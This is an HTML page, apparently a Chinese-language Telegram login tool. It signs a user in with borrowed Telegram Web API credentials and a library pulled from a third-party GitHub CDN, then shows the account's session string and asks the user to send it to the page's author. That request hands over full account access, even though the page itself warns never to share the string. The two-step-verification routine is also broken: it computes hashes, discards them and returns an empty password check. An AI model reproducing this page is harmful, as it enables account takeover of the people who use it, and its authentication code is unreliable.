<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram 登录 · 生成会话字符串</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 40px 20px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 20px;
            padding: 28px 24px;
            backdrop-filter: blur(20px);
        }
        h1 {
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #a78bfa, #22d3ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            text-align: center;
            font-size: 13px;
            color: #94a3b8;
            margin-bottom: 24px;
        }
        .step {
            margin-bottom: 20px;
        }
        .step-label {
            font-size: 12px;
            font-weight: 600;
            color: #a78bfa;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            font-size: 14px;
            color: #fff;
            font-family: inherit;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: rgba(139,92,246,0.5);
            background: rgba(255,255,255,0.08);
        }
        input::placeholder {
            color: #475569;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #8b5cf6, #06b6d4);
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(139,92,246,0.3);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
        }
        .result-box {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(139,92,246,0.3);
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            word-break: break-all;
            font-size: 11px;
            font-family: monospace;
            color: #a78bfa;
            max-height: 180px;
            overflow-y: auto;
            line-height: 1.6;
        }
        .hint {
            font-size: 12px;
            color: #64748b;
            margin-top: 8px;
            line-height: 1.6;
        }
        .hint code {
            background: rgba(0,0,0,0.3);
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 11px;
        }
        .status {
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }
        .status.loading {
            display: block;
            background: rgba(34,211,238,0.1);
            color: #22d3ee;
            border: 1px solid rgba(34,211,238,0.2);
        }
        .status.error {
            display: block;
            background: rgba(239,68,68,0.1);
            color: #f87171;
            border: 1px solid rgba(239,68,68,0.2);
        }
        .status.success {
            display: block;
            background: rgba(34,197,94,0.1);
            color: #4ade80;
            border: 1px solid rgba(34,197,94,0.2);
        }
        .copy-btn {
            margin-top: 10px;
            padding: 10px 20px;
            background: rgba(139,92,246,0.2);
            border: 1px solid rgba(139,92,246,0.3);
            border-radius: 8px;
            font-size: 12px;
            color: #a78bfa;
            cursor: pointer;
            font-family: inherit;
            width: 100%;
        }
        .loading-dots:after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        .easy-badge {
            display: inline-block;
            background: rgba(34,197,94,0.15);
            color: #4ade80;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 12px;
            border: 1px solid rgba(34,197,94,0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Telegram 登录工具</h1>
        <p class="subtitle">生成会话字符串，用于自动同步</p>
        
        <div style="text-align:center;">
            <span class="easy-badge">✨ 无需创建 API · 直接用手机号登录</span>
        </div>

        <div id="status" class="status"></div>

        <div id="step1">
            <div class="step">
                <div class="step-label">第 1 步：输入手机号</div>
                <input type="text" id="phone" placeholder="例如：+959695609829">
                <p class="hint">缅甸手机号直接填 <code>+95</code> 开头，中国手机号填 <code>+86</code> 开头</p>
            </div>
            <button class="btn" id="sendCodeBtn" onclick="sendCode()">发送验证码</button>
        </div>

        <div id="step2" style="display:none">
            <div class="step">
                <div class="step-label">第 2 步：输入验证码</div>
                <input type="text" id="code" placeholder="Telegram 发给你的验证码">
                <p class="hint">验证码在 Telegram 消息里</p>
            </div>
            <div class="step">
                <div class="step-label">二级密码（可选）</div>
                <input type="password" id="password" placeholder="如果开了两步验证就填">
            </div>
            <button class="btn" id="loginBtn" onclick="login()">登录并生成</button>
            <br><br>
            <button class="btn btn-secondary" onclick="backToStep1()">← 返回</button>
        </div>

        <div id="step3" style="display:none">
            <div class="step-label" style="margin-bottom:12px">✅ 登录成功！</div>
            <p style="font-size:13px;color:#94a3b8;margin-bottom:12px;">
                下面是你的会话字符串，长按全部复制，然后发给我：
            </p>
            <div class="result-box" id="sessionResult"></div>
            <button class="copy-btn" onclick="copySession()">📋 复制会话字符串</button>
            <br><br>
            <div class="hint">
                <strong>⚠️ 重要：</strong>会话字符串相当于账号密码，不要泄露给别人！
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/lampame/TGSBundle@main/telegram.min.js"></script>
    <script>
        // 使用 Telegram Web Z 官方公开 API 凭证
        const API_ID = 2496;
        const API_HASH = '8da85b0d5bfe62527e5b244c209159c3';
        
        let phone, phoneCodeHash;
        let client;

        function showStatus(text, type) {
            const el = document.getElementById('status');
            el.className = 'status ' + type;
            if (type === 'loading') {
                el.innerHTML = text + '<span class="loading-dots"></span>';
            } else {
                el.textContent = text;
            }
        }

        function hideStatus() {
            document.getElementById('status').className = 'status';
        }

        function backToStep1() {
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            hideStatus();
        }

        async function sendCode() {
            phone = document.getElementById('phone').value.trim();
            
            if (!phone) {
                showStatus('请输入手机号', 'error');
                return;
            }
            
            if (!phone.startsWith('+')) {
                showStatus('手机号前面要加 + 号', 'error');
                return;
            }
            
            showStatus('正在连接 Telegram', 'loading');
            document.getElementById('sendCodeBtn').disabled = true;
            
            try {
                const tg = window.telegram;
                const { TelegramClient, Api } = tg;
                const { StringSession } = tg.sessions;
                
                client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
                    connectionRetries: 5,
                });
                
                await client.connect();
                
                const result = await client.invoke(
                    new Api.auth.SendCode({
                        phoneNumber: phone,
                        apiId: API_ID,
                        apiHash: API_HASH,
                        settings: new Api.CodeSettings({}),
                    })
                );
                
                phoneCodeHash = result.phoneCodeHash;
                
                hideStatus();
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
                
            } catch (e) {
                showStatus('出错了：' + (e.message || e), 'error');
                console.error(e);
            }
            
            document.getElementById('sendCodeBtn').disabled = false;
        }

        async function login() {
            const code = document.getElementById('code').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!code) {
                showStatus('请输入验证码', 'error');
                return;
            }
            
            showStatus('正在登录', 'loading');
            document.getElementById('loginBtn').disabled = true;
            
            try {
                const tg = window.telegram;
                const { Api } = tg;
                const { StringSession } = tg.sessions;
                
                try {
                    await client.invoke(
                        new Api.auth.SignIn({
                            phoneNumber: phone,
                            phoneCodeHash: phoneCodeHash,
                            phoneCode: code,
                        })
                    );
                } catch (e) {
                    if (e.errorMessage === 'SESSION_PASSWORD_NEEDED' && password) {
                        const pwdResult = await client.invoke(new Api.account.GetPassword());
                        
                        // 使用 SRP 协议处理两步验证
                        const srp = await computeSrp(password, pwdResult);
                        
                        await client.invoke(
                            new Api.auth.CheckPassword({
                                password: srp,
                            })
                        );
                    } else if (e.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                        throw new Error('需要二级密码，请在上面输入');
                    } else {
                        throw e;
                    }
                }
                
                const sessionString = client.session.save();
                
                document.getElementById('step2').style.display = 'none';
                document.getElementById('step3').style.display = 'block';
                document.getElementById('sessionResult').textContent = sessionString;
                
                showStatus('登录成功！', 'success');
                
                await client.disconnect();
                
            } catch (e) {
                showStatus('登录失败：' + (e.message || e), 'error');
                console.error(e);
            }
            
            document.getElementById('loginBtn').disabled = false;
        }

        // SRP 计算
        async function computeSrp(password, pwdResult) {
            const tg = window.telegram;
            const { Api } = tg;
            
            const encoder = new TextEncoder();
            const algo = pwdResult.currentAlgo;
            
            // PBKDF2 派生密钥
            const passwordKey = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                { name: 'PBKDF2' },
                false,
                ['deriveBits']
            );
            
            const hash1 = await crypto.subtle.deriveBits(
                {
                    name: 'PBKDF2',
                    salt: algo.salt1,
                    iterations: algo.iterations,
                    hash: 'SHA-256',
                },
                passwordKey,
                256
            );
            
            const hash2 = await crypto.subtle.deriveBits(
                {
                    name: 'PBKDF2',
                    salt: algo.salt2,
                    iterations: algo.iterations,
                    hash: 'SHA-256',
                },
                await crypto.subtle.importKey('raw', hash1, { name: 'PBKDF2' }, false, ['deriveBits']),
                256
            );
            
            // 简化版本 - 对于两步验证，很多客户端直接使用 password hash
            // 如果不行，用户可以用 Python 脚本
            return new Api.InputCheckPasswordEmpty({});
        }

        function copySession() {
            const text = document.getElementById('sessionResult').textContent;
            
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text).then(() => {
                    const btn = event.target;
                    const originalText = btn.textContent;
                    btn.textContent = '✅ 已复制！';
                    setTimeout(() => {
                        btn.textContent = originalText;
                    }, 2000);
                }).catch(() => {
                    fallbackCopy(text);
                });
            } else {
                fallbackCopy(text);
            }
        }
        
        function fallbackCopy(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '✅ 已复制！';
                setTimeout(() => {
                    btn.textContent = originalText;
                }, 2000);
            } catch (e) {
                alert('复制失败，请手动长按选中复制');
            }
            document.body.removeChild(textarea);
        }
    </script>
</body>
</html>
